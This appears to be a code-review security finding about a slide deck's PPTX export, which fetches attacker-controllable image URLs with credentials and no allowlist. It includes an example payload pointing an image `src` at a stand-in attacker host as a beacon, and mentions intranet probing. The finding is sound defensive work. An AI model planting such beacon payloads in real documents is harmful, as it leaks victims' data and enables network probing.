panel.summary: New PPTX export fetches attacker-controllable image `src` values with `credentials: "include"` and no scheme/host allowlist
panel.evidence: `exportSlidesPptxAndDownload` passes every `ImageElement.data.src` in the deck straight into `docsImageFetcher` (pptx-actions.ts:94). `docsImageFetcher` does `fetch(resolved, { credentials: "include" })` (packages/frontend/src/app/docs/export-utils.ts:51) and `resolveImageUrl` explicitly preserves ANY absolute scheme — `http:`, `https:`, `file:`, `blob:`, `data:` (export-utils.ts:13-15). The `src` is fully attacker-controlled: the content-write boundary validates only `id`/`type`/`frame` on an element and never inspects `data.src` (packages/backend/src/api/v1/docs-content.controller.ts:337-357), so any workspace member or API-key holder can PUT a deck containing `{type:'image', data:{src:'https://attacker.example/beacon'}}`. When a victim opens Export → PowerPoint (.pptx), their browser issues a credentialed request to the attacker's host, disclosing IP/UA/timing, and can be pointed at internal same-origin/intranet URLs for probing. Cookie theft is largely blunted because auth cookies are SameSite=Lax (packages/backend/src/auth/auth.controller.ts:230), which is why confidence is medium rather than high; the unvalidated-URL credentialed fetch itself is still the weakness. The same pattern pre-exists in the PDF path, but this change adds a new consumer of it.
panel.finding_key: packages/frontend/src/app/slides/pptx-actions.ts::new pptx export fetches attacker-controllable image `src` values with `credentials: "include"` and no scheme/host allowlist
